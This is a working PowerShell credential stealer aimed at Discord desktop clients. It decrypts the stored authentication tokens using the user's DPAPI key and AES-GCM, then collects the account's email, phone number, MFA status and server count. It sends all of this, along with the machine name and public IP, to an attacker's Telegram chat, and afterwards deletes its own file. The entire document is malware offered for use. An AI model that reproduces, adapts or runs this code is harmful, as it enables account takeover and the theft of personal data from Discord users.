<#
.SYNOPSIS
    Extracts Discord authentication tokens and optionally sends them to a Telegram chat with enriched metadata.

.DESCRIPTION
    - Reads Discord’s encrypted Local State to retrieve the DPAPI-protected master key.
    - Decrypts the master key using Windows DPAPI.
    - Scans the LevelDB folder for AES-GCM–encrypted token blobs.
    - Decrypts the blobs to recover Discord tokens.
    - Sends the token and enriched metadata to a Telegram chat via the Bot API.
    - Deletes the script file from disk after sending the report.

.PARAMETER botToken
    Your Telegram Bot API token.

.PARAMETER chatId
    The target Telegram chat ID.

.PARAMETER DryRun
    If set, the script will print the token(s) and metadata instead of sending to Telegram.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory)] [string] $botToken,
    [Parameter(Mandatory)] [string] $chatId,
    [switch] $DryRun
)

# Confirm environment
if ($PSVersionTable.PSVersion.Major -lt 7 -or $env:OS -notmatch 'Windows') {
    Write-Error 'Requires PowerShell 7+ on Windows'
    exit 1
}

# Setup
$appData = [Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
Write-Verbose "Using AppData path: $appData"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName System.Security
$Unprotect = [System.Security.Cryptography.ProtectedData]::Unprotect

function Get-MasterKey {
    param([string] $BasePath)
    $stateFile = Join-Path $BasePath 'Local State'
    if (-not (Test-Path $stateFile)) { return }
    Write-Verbose "Loading master key from $stateFile"
    try {
        $json   = Get-Content $stateFile -Raw | ConvertFrom-Json
        $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
        $rawKey = $encKey[5..($encKey.Length - 1)]
        return $Unprotect.Invoke($rawKey, $null, 'CurrentUser')
    } catch {
        Write-Warning "Failed to decrypt master key: $_"
    }
}

function Convert-EncryptedBlob {
    param(
        [byte[]] $Blob,
        [byte[]] $Key
    )
    $iv     = $Blob[3..14]
    $cipher = $Blob[15..($Blob.Length - 17)]
    $tag    = $Blob[($Blob.Length - 16)..($Blob.Length - 1)]
    $aes    = [System.Security.Cryptography.AesGcm]::new($Key)
    $plain  = New-Object byte[] $cipher.Length
    try {
        $aes.Decrypt($iv, $cipher, $tag, $plain)
        return [Text.Encoding]::UTF8.GetString($plain).Trim([char]0)
    } catch {
        Write-Verbose "Blob conversion failed: $_"
    }
}

function Get-DiscordTokens {
    param(
        [string] $BasePath,
        [byte[]] $Key
    )
    $dbPath = Join-Path $BasePath 'Local Storage\leveldb'
    if (-not (Test-Path $dbPath)) { return }
    Write-Verbose "Scanning LevelDB at $dbPath"
    $regex = [Regex]'dQw4w9WgXcQ:([\w+/=]+)'
    foreach ($file in Get-ChildItem $dbPath -Filter *.ldb -File) {
        $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
        foreach ($match in $regex.Matches($content)) {
            $blob  = [Convert]::FromBase64String($match.Groups[1].Value)
            $token = Convert-EncryptedBlob -Blob $blob -Key $Key
            if ($token) { return $token }
        }
    }
}

function Get-PublicIP {
    try {
        $resp = Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -UseBasicParsing -ErrorAction Stop
        return $resp.ip
    } catch {
        Write-Verbose "Failed to fetch public IP: $_"
        return 'Unknown'
    }
}

function Get-DiscordUserInfo {
    param([string] $Token)
    $headers = @{ Authorization = $Token }
    try {
        $user = Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me' -Headers $headers -UseBasicParsing -ErrorAction Stop
    } catch {
        Write-Verbose "Failed to fetch user info: $_"
        return @{}
    }
    $guildCount = 0; $hasNitro = $false
    try { $guilds = Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me/guilds?with_counts=true' -Headers $headers -UseBasicParsing -ErrorAction Stop; $guildCount = $guilds.Count } catch {}
    try { $subs    = Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me/billing/subscriptions' -Headers $headers -UseBasicParsing -ErrorAction Stop; $hasNitro = ($subs.Count -gt 0) } catch {}
    return @{ username = "$($user.username)#$($user.discriminator)"; email = $user.email; phone = $user.phone; mfa = $user.mfa_enabled; guildCount = $guildCount; hasNitro = $hasNitro }
}

function Invoke-DiscordTokenReport {
    param(
        [string] $Source,
        [string] $Token
    )
    $publicIP     = Get-PublicIP
    $timestamp    = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    $info         = Get-DiscordUserInfo -Token $Token
    $userName     = $env:USERNAME
    $computerName = $env:COMPUTERNAME

    $message = @"
<b>Source:</b> $Source
<b>Token:</b> $Token

<b>Account:</b> $($info.username)
<b>Email:</b> $($info.email)
<b>Phone:</b> $($info.phone)
<b>MFA:</b> $($info.mfa)
<b>Guilds:</b> $($info.guildCount)
<b>Nitro:</b> $($info.hasNitro)

<b>Machine:</b> $userName on $computerName
<b>IP:</b> $publicIP
<b>Time:</b> $timestamp
"@.Trim()

    $uri  = "https://api.telegram.org/bot$botToken/sendMessage"
    $body = @{ chat_id = $chatId; text = $message; parse_mode = 'HTML' } | ConvertTo-Json
    Write-Verbose "Posting report to Telegram"
    try { Invoke-RestMethod -Uri $uri -Method Post -ContentType 'application/json' -Body $body -ErrorAction Stop | Out-Null } catch { Write-Error "Failed to send report: $_" }

    # Self-destruct
    Write-Verbose "Deleting script file $PSCommandPath"
    Remove-Item -LiteralPath $PSCommandPath -Force
}

# Main execution
$installDirs = @(
    "$appData\Discord",
    "$appData\discordcanary",
    "$appData\discordptb",
    "$appData\Lightcord"
)
foreach ($dir in $installDirs) {
    if (Test-Path $dir) {
        Write-Verbose "Checking installation at $dir"
        $masterKey = Get-MasterKey -BasePath $dir
        if ($masterKey) {
            $token = Get-DiscordTokens -BasePath $dir -Key $masterKey
            if ($token) {
                if ($DryRun) { Write-Host "[DryRun] Token: $token"; exit 0 }
                Invoke-DiscordTokenReport -Source $dir -Token $token
                exit 0
            }
        }
    }
}

Write-Host 'No token found.'
